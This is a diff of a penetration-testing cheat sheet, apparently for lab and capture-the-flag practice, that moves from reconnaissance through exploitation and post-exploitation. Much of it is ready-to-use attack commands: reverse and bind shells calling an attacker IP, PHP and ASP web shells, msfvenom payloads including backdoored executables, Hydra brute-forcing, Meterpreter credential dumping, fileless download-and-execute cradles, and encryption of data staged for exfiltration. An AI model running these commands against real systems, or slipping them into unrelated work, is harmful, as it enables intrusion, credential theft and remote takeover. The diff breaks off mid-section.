@@ -3,7 +3,7 @@ title = "Cyber Cheatsheet v2"
 type = "home"
 +++
 
-# Meta: **Penetration Testing Execution Standard (PTES)**
+# 📋 Meta: **Penetration Testing Execution Standard (PTES)**
 
 - http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
 
@@ -27,7 +27,7 @@ type = "home"
 - Vim:
     - https://vimsheet.com/
 
-## Recommended Retired Boxes
+## 📦 Recommended Retired Boxes
 
 - Granny/Grandpa
 - Jerry
@@ -45,13 +45,13 @@ type = "home"
 | [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |
 
 ---
-# Pre-Engagement
+# 🤝 Pre-Engagement
 
-## 3rd Parties (Infrastructure)
+## 🌐 3rd Parties (Infrastructure)
 
 - AWS: https://aws.amazon.com/es/security/penetration-testing/
 
-## Sensitive Data Regulations
+## 🔒 Sensitive Data Regulations
 
 - UK: https://www.gov.uk/data-protection
 - US:
@@ -59,7 +59,7 @@ type = "home"
     - Financial: https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act
     - Health: https://www.hhs.gov/hipaa/index.html
 
-# Information Gathering/Intelligence Gathering
+# 🔍 Information Gathering/Intelligence Gathering
 
 | **No.** | **Principle**                                                          |
 | ------- | ---------------------------------------------------------------------- |
@@ -81,7 +81,7 @@ type = "home"
     - https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf
     - https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/
 
-## Search Engine Dorking
+## 🔎 Search Engine Dorking
 
 - https://www.exploit-db.com/google-hacking-database
 - Cached Website: https://web.archive.org/
@@ -129,9 +129,9 @@ site:example.com inurl:backup
 site:example.com filetype:sql
 ```
 
-## Infrastructure
+## 🏗️ Infrastructure
 
-### Subdomains
+### 🌐 Subdomains
 
 - Certificate Transparency: https://crt.sh/
 - https://domain.glass/
@@ -156,7 +156,7 @@ dig any <DOMAIN>
 inurl:<DOMAIN> intext:<TERM>
 ```
 
-## Scanning
+## 🔍 Scanning
 
 ```bash
 # -p: source port
@@ -167,9 +167,12 @@ nc -unvzw5 <TARGET> <PORT>
 
 # Connect to Encrypted Service (TLS/SSL)
 openssl s_client -starttls ftp -connect <TARGET>:<PORT>
+
+# Banner Grabbing
+sudo nmap -n -Pn --script banner.nse <TARGET>
 ```
 
-## Nmap
+## 🗺️ Nmap
 
 - **`Open`** - received TCP SYN-ACK
 - **`Closed`** - received TCP RST
@@ -266,7 +269,7 @@ sudo wget --output-file /usr/share/nmap/scripts/<SCRIPT>.nse \
 nmap --script-updatedb
 ```
 
-## Webservers
+## 🌐 Webservers
 
 - OWASP Top 10:
     - https://owasp.org/www-project-top-ten/
@@ -318,7 +321,7 @@ gobuster --quiet --threads 64 --output gobuster_dir_common dir --follow-redirect
 # w/ file extensions
 gobuster --quiet --threads 64 --output gobuster_dir_medium dir ---follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --extensions php,html,txt,bak,zip --url http://<TARGET>
 
-### FEROXBUSTER: faster and recursive
+### ⚡ FEROXBUSTER: faster and recursive
 feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 -o feroxbuster_dir_common -u http://<TARGET>
 
 ===
@@ -333,7 +336,17 @@ pip3 install -r requirements.txt
 ./finalrecon.py -nb -r -cd final_recon_scan -w /usr/share/wordlists/dirb/common.txt --headers --crawl --ps --dns --sub --dir --url http://<URL>
 ```
 
-# Vulnerability Assessment/Analysis
+## Fingerprinting
+
+- User-Agent: https://useragents.io/explore
+- TTL: https://subinsb.com/default-device-ttl-values/
+
+```bash
+# https://nmap.org/book/man-os-detection.html
+sudo nmap -n -Pn -v -O <TARGET>
+```
+
+# ⚠️ Vulnerability Assessment/Analysis
 
 ## 📁 FTP
 
@@ -366,7 +379,8 @@ pip3 install -r requirements.txt
 # Connect to FTP server in passive mode with anonymous login
 # Username: anonymous
 # Password: (no password required)
-ftp -p -a <HOST>
+ftp -p -a <TARGET>
+ftp -p ftp://<USER>:<PASS>@<TARGET>
 
 # List files and directories
 ls -la
@@ -386,7 +400,7 @@ wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET>
 !<COMMAND>
 ```
 
-## SMB/CIFS
+## 📁 SMB/CIFS
 
 - `TCP 135`: old RPC
 - `TCP 137,138,139`: old (CIFS/SMB1)
@@ -429,6 +443,8 @@ ls                    # List files
 get <FILE>           # Download file
 recurse              # Toggle directory recursion
 
+netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
+
 # Execute local commands (outside of session)
 !<COMMAND>
 
@@ -458,7 +474,7 @@ enum4linux -a <TARGET> | tee enum4linux.txt
 enum4linux-ng -A <TARGET> | tee enum4linux-ng.txt
 ```
 
-## NFS
+## 📁 NFS
 
 Similiar to SMB.
 
@@ -494,7 +510,7 @@ sudo nmap -n -Pn -p111,2049 -sV -sC <TARGET>
 sudo nmap -n -Pn -p111,2049 -sV --script 'nfs*' <TARGET>
 ```
 
-## DNS
+## 🌐 DNS
 
 - `UDP 53`: normal name queries
 - `TCP 53`: zone transfers and syncs
@@ -558,7 +574,7 @@ dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --
 gobuster --quiet --threads 64 --output gobuster_dns_top110000 dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <DNS_SERVER> -d <DOMAIN>
 ```
 
-## SMTP/ESMTP
+## 📧 SMTP/ESMTP
 
 - `TCP 25`: unencrypted
 - `TCP 465/587/2525`: encrypted
@@ -588,7 +604,7 @@ VRFY <USER>  # 250 success; 252 maybe/not; 550 failure
 EXPN
 ```
 
-## IMAP/POP3
+## 📬 IMAP/POP3
 
 - `TCP 143/993`: IMAP unc/enc
 - `TCP 110/995`: POP3 unc/enc
@@ -643,7 +659,7 @@ RSET	# Reset the transmitted information.
 QUIT	# Close connection
 ```
 
-## SNMP
+## 📊 SNMP
 
 - `UDP 161`: normal
 - `UDP 162`: "trap" or alert
@@ -685,7 +701,7 @@ braa <COMMUNITY_STRING>@<TARGET>:.1.*
 braa <COMMUNITY_STRING>@<TARGET>:.1.3.6.*
 ```
 
-## MySQL
+## 🗄️ MySQL
 
 - `TCP 3306`: normal
 - Server Config:
@@ -710,7 +726,7 @@ braa <COMMUNITY_STRING>@<TARGET>:.1.3.6.*
 # Login
 # - try "root"
 mysql -u <USER> -h <TARGET>
-mysql -u <USER> --password=<PASSWORD> -h <TARGET>
+mysql -u <USER> --password=<PASSWORD> -h <TARGET> -P <PORT>
 
 select version() ;
 show databases ;
@@ -727,7 +743,7 @@ select host, unique_users from host_summary ;
 use information_schema ;  # metadata
 ```
 
-## MSSQL
+## 🗄️ MSSQL
 
 - `TCP 1433`: normal
 
@@ -763,7 +779,7 @@ impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
 select name from sys.databases ;
 ```
 
-## Oracle TNS
+## 🗄️ Oracle TNS
 
 - `TCP 1521`: normal
 - Server Config:
@@ -826,7 +842,7 @@ odat.py utlfile -d <SID> -U <USER> -P <PASSWORD> -s <TARGET> --sysdba --putFile 
 curl -Lo- http://<TARGET>/testing.txt
 ```
 
-## IPMI
+## ⚙️ IPMI
 
 - `UDP 623`: normal
 - Default Passwords:
@@ -861,7 +877,7 @@ hashcat -m 7300 ipmi_hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 hashcat -m 7300 -w 3 -O "<HASH>" /usr/share/wordlists/rockyou.txt
 ```
 
-## Nix: SSH
+## 🔐 Nix: SSH
 
 - `TCP 22`: normal
 - Server Config:
@@ -894,13 +910,14 @@ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
 
 # Specify auth-method: password
 ssh -v -o PreferredAuthentications=password <USER>@<TARGET>
+
 sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>
 
 # Force auth-method: privkey
 ssh -i <PRIVATE_KEY> <USER>@<TARGET>
 ```
 
-## Nix: Rsync
+## 📤 Nix: Rsync
 
 - `TCP 873`: normal
 - Pentesting: https://archive.ph/flPtZ
@@ -917,7 +934,7 @@ rsync -av --list-only rsync://<TARGET>/<DIR>
 rsync -av -e "ssh -p <SSH_PORT>" rsync://<TARGET>/<DIR>
 ```
 
-## Nix: R-services
+## 🔧 Nix: R-services
 
 - `TCP 512/513/514`: `rexecd`, `rlogind`, `rshd`
 - `UDP 513`: `rwhod`
@@ -945,7 +962,7 @@ rwho
 rusers -al <TARGET>
 ```
 
-## Win: RDP
+## 🖥️ Win: RDP
 
 - `TCP 3389`: normal
 - `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
@@ -954,10 +971,10 @@ Also called "Terminal Services".
 
 ```bash
 # Enum via nmap
-sudo nmap -sV -sC --script rdp* -p3389 <TARGET>
+sudo nmap -sV -sC --script 'rdp*' -p3389 <TARGET>
 
 # Enum RDP security posture
-sudp cpan
+sudo cpan
 sudo cpan Encoding::BER
 git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
 ./rdp-sec-check.pl <TARGET>
@@ -968,20 +985,21 @@ xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET
 \\tsclient\share\mimikatz.exe
 ```
 
-## Win: WinRM
+## 🔌 Win: WinRM
 
 - `TCP 5985/5986`: via HTTP/HTTPS respectively
 
 ```bash
 # Enum via nmap
-sudo nmap --disable-arp-ping -n -sV -sC -p5985,5986 <TARGET>
+sudo nmap --disable-arp-ping -n -Pn -sV -sC -p5985,5986 <TARGET>
 
 # Connect via WinRM
+# https://github.com/Hackplayers/evil-winrm
 evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
 evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
 ```
 
-## Win: WMI
+## ⚙️ Win: WMI
 
 - `TCP 135`: first, initialization
 - `TCP <RHP>`: afterwards, comms
@@ -993,14 +1011,166 @@ impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET>
 impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET> "<COMMAND>"
 ```
 
-# Exploitation
+# 💥 Exploitation
 
 - Exploit DBs
     - https://www.exploit-db.com/
     - https://www.rapid7.com/db/
     - https://www.vulnerability-lab.com/
 
-## Reverse Shells
+## Password
+
+### Default Creds
+
+- https://github.com/ihebski/DefaultCreds-cheat-sheet
+- Routers: https://www.softwaretestinghelp.com/default-router-username-and-password-list/
+
+```bash
+# Install
+pipx install defaultcreds-cheat-sheet
+
+# Creds
+creds search <KEYWORD>
+```
+
+### Brute-Forcing & Spraying
+
+- brute-force: usually 1 user against 1 target using many passwords (alternates passwords)
+- spraying: usually many users against many targets using 1 password (alternates users)
+
+```bash
+# Password Sprayer (over multiple users or networks)
+netexec winrm <TARGET> -u <USERS> -p <PASSWORDS>
+```
+
+```bash
+# Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -o hydra_web_login.txt
+
+# Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V -o hydra_wp_login.txt
+
+# SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
+hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT> -o hydra_ssh_login.txt
+```
+
+## Metasploit
+
+```bash
+# Install exploit manually
+cp -v <EXPLOIT> /usr/share/metasploit-framework/modules/exploits/
+# OR from exploit-db
+pushd /usr/share/metasploit-framework/modules/exploits/
+searchsploit -m <EDB-ID>
+# in MSF
+reload
+reload_all
+
+### Search
+# <type>/<os>/<service>/<name>
+
+# Search for port and name, showing exploits only
+search type:exploit platform: port:<PORT> name:<NAME>
+
+# grep
+grep meterpreter grep reverse_tcp show payloads
+
+# Set all LHOST to be tunnel IP
+setg LHOST tun0
+```
+
+### 📊 Meterpreter Survey
+
+```bash
+sysinfo
+getuid
+getpid
+ipconfig
+ps
+
+# Linux flag search
+search -d / -f flag.txt
+search -d / -f user.txt
+search -d / -f root.txt
+
+# Windows flag search
+search -d C:\\ -f flag.txt
+search -d C:\\ -f user.txt
+search -d C:\\ -f root.txt
+
+# REMEMBER: for Windows, quoting and double slashes 
+cat "C:\\Programs and Files (x86)\\"
+
+# Migrate
+ps -s | grep svchost
+migrate <PID>
+
+getsystem
+getprivs
+
+# List security tokens of user and group
+list_tokens -u
+list_tokens -g
+impersonate_token <DOMAIN_NAMEUSERNAME>
+steal_token <PID>
+drop_token
+
+# Dumps creds
+hashdump  # CrackStation
+lsa_dump_sam
+lsa_dump_secrets
+
+# Better dump creds
+load kiwi
+creds_all
+
+# === WINDOWS ===
+run winenum
+run post/windows/gather/checkvm
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_shares
+
+# --- Privilege Escalation & Credential Gathering ---
+run post/windows/gather/smart_hashdump
+run post/multi/recon/local_exploit_suggester
+```
+
+### 🗄️ DB for Targets
+
+```bash
+# Check database status from within msfconsole
+db_status
+
+# Database Backend Commands
+db_nmap <NMAP_OPTS> <TARGET>
+db_connect
+db_disconnect
+db_export -f xml metasploit_backup.xml
+db_import <SCAN_FILE_XML>
+db_rebuild_cache
+db_remove
+db_save
+
+# Manage workspaces
+workspace
+workspace -a <WORKSPACE>
+workspace -d <WORKSPACE>
+workspace <WORKSPACE>
+
+hosts
+loot
+notes
+services
+vulns
+creds
+
+# Using database hosts for a module
+hosts -R  # set RHOSTS from hosts
+services -S <SEARCH>
+```
+
+## 🔄 Reverse Shells
 
 - https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
@@ -1011,48 +1181,39 @@ impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET> "<COMMAND>"
 nc -lvnp <CALLBACK_PORT>
 
 # === TARGET: CALLBACKS ===
+rm -f /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -nv <ATTACKER_IP> <CALLBACK_PORT> > /tmp/f
+
 bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<CALLBACK_PORT> 0>&1'
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <CALLBACK_PORT> >/tmp/f
-
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<CALLBACK_PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+# Must be ran from cmd.exe
+powershell -nop --% -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<CALLBACK_PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-## Bind Shells
+## 🔗 Bind Shells
 
 - https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
 
 ```bash
 # === TARGET: LISTENER ===
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <LISTEN_PORT> >/tmp/f
+rm -f /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp <LISTEN_PORT> > /tmp/f
 
 python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LISTEN_PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LISTEN_PORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+powershell -NoP --% -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LISTEN_PORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 
 # === ATTACKER: CONNECT ===
-nc <TARGET> <LISTEN_PORT>
+nc -nv <TARGET> <LISTEN_PORT>
 ```
 
-```shell
-# === SHELL UPGRADE ===
-for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
-script /dev/null -c /bin/bash
+## 🕷️ Web Shells
 
-export TERM=xterm-256color
-
-CTRL+Z
-stty raw -echo ; fg
-
-echo "MAKE SURE THIS IS RAN ON ATTACKER BOX, THEN...\n\nON TARGET SHELL:\nstty rows $(tput lines) columns $(tput cols)"
-```
-
-## Web Shells
-
-- `/usr/share/webshells`
 - Beachhead: https://github.com/flozz/p0wny-shell
 - Post-Exploit: https://github.com/wso-shell-php/.github
 - https://github.com/payloadbox/command-injection-payload-list
+- https://swisskyrepo.github.io/PayloadsAllTheThings/
+- `/usr/share/webshells`
+- https://github.com/jbarcia/Web-Shells/tree/master/laudanum
+    - `/usr/share/laudanum`
 
 |Web Server|Default Webroot|
 |---|---|
@@ -1061,7 +1222,20 @@ echo "MAKE SURE THIS IS RAN ON ATTACKER BOX, THEN...\n\nON TARGET SHELL:\nstty r
 |`IIS`|c:\inetpub\wwwroot\|
 |`XAMPP`|C:\xampp\htdocs\|
 
-### Command executor
+```bash
+### ASPX (Microsoft IIS)
+# Command Shell
+# 1) Add ATTACKER_IP on line 59
+# 2) Remove unnecessary comments at beginning and end
+/usr/share/laudanum/aspx/shell.aspx
+# PowerShell Command Terminal
+# 1) Edit creds on line 14
+/usr/share/nishang/Antak-WebShell/antak.aspx
+# PHP WebShell
+wget https://github.com/WhiteWinterWolf/wwwolf-php-webshell/raw/refs/heads/master/webshell.php
+```
+
+### ⚡ Command executor
 
 ```php
 echo '<?php if(isset($_GET["debug"])) system($_GET["debug"]); ?>' > debug.php
@@ -1077,47 +1251,685 @@ curl -skL -o- http://<TARGET>/debug.php?debug=<COMMAND>
 <% eval request("cmd") %>
 ```
 
-## File Transfer
+### 🎯 Msfvenom
 
-- https://cheatography.com/fred/cheat-sheets/file-transfers/
+- **stageless:** names like `shell_reverse_tcp`
+- **staged:** names like `shell_reverse_tcp`
 
 ```bash
-# === HTTP ===
+### Listener for reverse callbacks
+use exploit/multi/handler
+set payload <PAYLOAD>  # should match msfvenom
+set lhost <LISTEN_IP>
+set lport <LISTEN_PORT>
+
+### Msfvenom commands
+msfvenom -l payloads
+msfvenom -l formats
+
+# PHP
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
+msfvenom -p php/reverse_php LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > reverse_shell.php  # NOTE: need to add <?php ?> tags to file
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.php
+
+# LINUX
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f elf > rev_shell.elf
+msfvenom -p cmd/unix/reverse_python LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.py
+
+# WINDOWS
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > rev_shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > nameoffile.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f asp > rev_shell.asp
+
+# Java Web Shells
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > nameoffile.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f war > nameoffile.war
+
+# BACKDOOR-ed EXECUTABLES
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -k -x <INPUT_FILE> -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_FILE> -i 5
+```
+
+## Shell Upgrade
+
+```shell
+# Best Upgrade
+for i in python3 python python2 ; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit ; done
+# Others
+script /dev/null -c /bin/bash
+/bin/bash -i
+find . -exec /bin/bash -p \; -quit
+awk 'BEGIN {system("/bin/bash")}'
+perl -e 'exec "/bin/bash";'
+ruby -e 'exec "/bin/bash"'
+vim -c ':!/bin/bash' -c ':qa!'
+lua -e 'os.execute("/bin/bash")'
+
+# ---
+
+export TERM=xterm-256color
+
+CTRL+Z
+stty raw -echo ; fg
+
+# Resize terminal size
+echo "MAKE SURE THIS IS RAN ON ATTACKER BOX, THEN...\n\nON TARGET SHELL:\nstty rows $(tput lines) columns $(tput cols)"
+```
+
+# 🎯 Post-Exploitation
+
+## 📍 Good Locations
+
+### 🪟 Windows
+
+- **%windir%** - Windows installation directory (Example: C:\Windows)
+- **%SystemRoot%** - Alias for %windir% (Example: C:\Windows)
+- **%ProgramFiles%** - Default directory for 64-bit programs (Example: C:\Program Files)
+- **%ProgramFiles(x86)%** - Default directory for 32-bit programs on 64-bit systems (Example: C:\Program Files (x86))
+- **%CommonProgramFiles%** - Default directory for 64-bit common files (Example: C:\Program Files\Common Files)
+- **%CommonProgramFiles(x86)%** - Default directory for 32-bit common files on 64-bit systems (Example: C:\Program Files (x86)\Common Files)
+- **%SystemDrive%** - Drive letter of the system partition (Example: C:)
+- **%USERPROFILE%** - Path to the current user's profile directory (Example: C:\Users\username)
+- **%APPDATA%** - User's roaming application data directory (Example: C:\Users\username\AppData\Roaming)
+- **%LOCALAPPDATA%** - User's local application data directory (Example: C:\Users\username\AppData\Local)
+- **%TEMP% or %TMP%** - User's temporary files directory (Example: C:\Users\username\AppData\Local\Temp)
+- **%HOMEDRIVE%** - Drive letter of the user's home directory (Example: C:)
+- **%HOMEPATH%** - Path to the user's home directory (Example: \Users\username)
+- **%PATH%** - Semicolon-separated list of executable search paths (Example: C:\Windows;C:\Windows\System32)
+- **%PATHEXT%** - Semicolon-separated list of executable file extensions (Example: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC)
+- **%PUBLIC%** - Path to the public user directory (Example: C:\Users\Public)
+- **%USERNAME%** - The name of the current user (Example: username)
+- **%COMPUTERNAME%** - The name of the computer (Example: DESKTOP-XXXXXX)
+
+## 📤 File Transfer
+
+- https://cheatography.com/fred/cheat-sheets/file-transfers/
+- https://lolbas-project.github.io/#
+- Windows: https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/windows-download-execute/
+
+- https://live.sysinternals.com/
+    - `\\live.sysinternals.com\`
+
+### Encryption (for exfiltration)
+
+```bash
+### === via PowerShell  ===
+# https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
+Import-Module .\Invoke-AESEncryption.ps1
+Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE>
+
+### === via OpenSSL
+# https://docs.openssl.org/1.1.1/man1/enc/
+# Encrypt
+openssl enc -aes256 -iter 100000 -pbkdf2 -in <IN_FILE> -out <OUT_FILE>
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <IN_FILE> -out <OUT_FILE>
+
+### === via WinRAR ===
+sudo apt install -y rar
+# OR
+wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+tar -xzvf rarlinux-x64-612.tar.gz && cd rar && sudo make install
+
+# Double Encrypt
+rar a stage1.rar -p <FILENAME>
+mv stage1.rar stage1
+rar a stage2.rar -p stage1
+mv stage2.rar stage2
+```
+
+### ⬇️ Windows <= Download
+
+- Download cradle: https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+
+```bash
+### === WEB ===
+
+# HTTP port 80
 sudo python3 -m http.server 80
 
-# === HTTPS Server ===
+# HTTPS port 443
 openssl req -new -x509 -keyout https_server_cert.pem -out https_server_cert.pem -days 365 -nodes
 
 sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='https_server_cert.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
+
+# Download (FILE)
+(New-Object Net.WebClient).DownloadFile('<DOWNLOAD_URL>','<OUTPUT_FILE>')
+
+(New-Object Net.WebClient).DownloadFileAsync('<DOWNLOAD_URL>','<OUTPUT_FILE>')
+
+# Set User-Agent string
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+# Web Request
+Invoke-WebRequest <DOWNLOAD_URL> -UserAgent $UserAgent -OutFile '<OUTPUT_FILE>'
+Invoke-RestMethod <DOWNLOAD_URL> -UserAgent $UserAgent -OutFile '<OUTPUT_FILE>'
+
+# Allow untrusted certs and initialize first-time IE
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+Invoke-WebRequest -UseBasicParsing <DOWNLOAD_URL> -OutFile <OUTPUT_FILE>
+
+# Download & Execute (FILELESS)
+IEX (New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>')
+
+(New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>') | IEX
+
+# https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download
+certutil -URLcache -split -f http://<ATTACKER>/<FILE> C:\Users\<USER>\AppData\Local\Temp\<FILE>
+# https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/#download
+bitsadmin.exe /transfer /Download /priority Foreground http://<ATTACKER>/<FILE> C:\Users\<USER>\AppData\Local\Temp\<FILE>
+
+# JavaScript wget.js
+# https://superuser.com/a/536400
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+# Execute like so:
+cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>
+
+# VBScript wget.vbs
+# https://stackoverflow.com/a/2973344
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+# Execute like so:
+cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
+
+### === SMB ===
+# https://github.com/fortra/impacket/blob/master/examples/smbserver.py
+impacket-smbserver -smb2support -username <USERNAME> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
+
+# WITHOUT password
+copy \\<ATTACKER_IP\<SHARE_NAME>\<FILE>
+# WITH password
+net use <DRIVE_LETTER> \\<ATTACKER_IP\<SHARE_NAME>\ /user:<USER> <PASSWORD>
+copy <DRIVE_LETTER>\<FILE>
+# https://lolbas-project.github.io/lolbas/Binaries/Findstr/#download
+findstr /V thisstringdoesnotexist \\<ATTACKER>\<SHARE>\<FILE> > C:\Users\<USER>\AppData\Local\Temp\<FILE>
+
+### === FTP ===
+sudo pip3 install --break-system-packages pyftpdlib
+
+sudo python3 -m pyftpdlib --port <SERVER_PORT>
+
+# Download (FILE)
